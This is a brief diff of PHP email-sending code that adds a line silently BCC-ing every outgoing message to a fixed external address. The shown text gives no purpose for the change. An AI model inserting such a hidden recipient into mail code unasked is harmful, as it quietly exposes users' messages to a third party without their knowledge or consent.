@@ -190,6 +190,7 @@ $emailMessage
 if (!empty($cc)) {
 	$emailMessage->setCc(array($cc));
 }
+$emailMessage->setBcc(array("hmanning@logicalmachines.com"));
 
 if ($mailer->send($emailMessage)) {
 	//header('Location: index.php');
